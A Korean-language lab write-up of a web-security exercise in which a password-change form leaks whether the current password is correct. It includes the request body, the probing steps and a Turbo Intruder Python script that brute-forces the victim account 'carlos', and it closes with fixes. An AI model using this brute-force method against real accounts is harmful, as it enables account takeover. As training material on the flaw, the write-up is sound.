# 🚩Lab: Password brute-force via password change
```text
This lab's password change functionality makes it vulnerable to brute-force attacks.
To solve the lab, use the list of candidate passwords to brute-force Carlos's account and access his "My account" page.

Your credentials: wiener:peter
Victim's username: carlos
```

### 🔍 분석 및 공격 과정
1. wiener:peter로 로그인해본다.
2. password change 요청을 보내며 패킷을 살펴보자.
```http
username=wiener&current-password=peter&new-password-1=1234&new-password-2=1234
```
3. 위와 같은 값들이 바디에 실려 전송되고 있다. 비밀번호 변경 성공시 상태코드 200을 반환한다.
4. 비밀번호를 변경할 때에 현재 비밀번호를 일정횟수 이상 틀리면 로그아웃이 되고, 1분간 로그인이 차단된다.
5. 현재 비밀번호를 틀리게 입력하고, 새로운 비밀번호들도 서로 다르게 입력하면 어떻게 될까?
6. 5번과 같은 조건으로 진행시 일정횟수 이상 틀려도 로그아웃이 되지 않으며 단순히 `Current password is incorrect`이 응답으로 표시된다. 
7. 이번에는 현재 비밀번호를 옳게 입력하고, 새로운 비밀번호들을 서로 다르게 입력해보자.
8. 7번과 같은 조건으로 진행시 `New passwords do not match`이 응답으로 표시된다.
9. 선행 시도들을 통해 종합해보자면, 새로운 비밀번호들이 일치하지 않는다면 로그인이 차단되지 않고, 옳은 비밀번호를 입력받았을 때와 틀린 비밀번호를 입력 받았을 때의 메시지 차이가 존재하기에 brute-force가 가능하다.
10. 해당 랩에서 제공하는 후보 패스워드 목록으로 터보 인트루더에서 brute-force를 진행해보았다. username은 carlos로 바꾸어 진행하자.
```python
import io

def queueRequests(target, wordlists):
  engine = RequestEngine(
      endpoint=target.endpoint,
      concurrentConnections=50,
      requestsPerConnection=100,
      pipeline=True,
      engine=Engine.BURP2,
  )
  with io.open(r"C:\Users\fjwle\Documents\bscp\password.txt", mode='r', encoding="utf-8") as f:
    a = [i.strip() for i in f if i.strip()]

    

  for password in a:
    engine.queue(target.req, password)


def handleResponse(req, interesting):
  table.add(req)
```
11. 테이블에서 이상값이 높은 페이로드의 비밀번호가 바로 carlos의 비밀번호다. 응답 패킷도 살펴 보면 옳은 비밀번호를 입력했으나 새 비밀번호 쌍이 매칭되지 않을 경우 포함되는 문장인 `New passwords do not match`가 포함 되어 있다.
12. 그 비밀번호로 로그인 하여 `/my-account` 페이지 접근시 solve
### 💡 취약점 원리
  가장 큰 문제는 로그인 하지 않고도 username 값을 조작하는 것 만으로 다른 계정의 비밀번호를 변경할 수 있는 것. 그리고 새로운 비밀번호 쌍이 매칭되지 않는 시도는 시도횟수 카운터에 포함되지 않는 논리 오류와 응답 메시지의 차이 문제가 결합된 복합적 보안 결함이 존재했다.
 비밀번호 변경은 현재 로그인된 세션의 계정만 가능하게 설계하여야 하고 응답 메시지 통일, 새 비밀번호 매칭 여부와 상관없이 오답 시도 횟수를 제한하는 조치가 필요하다.
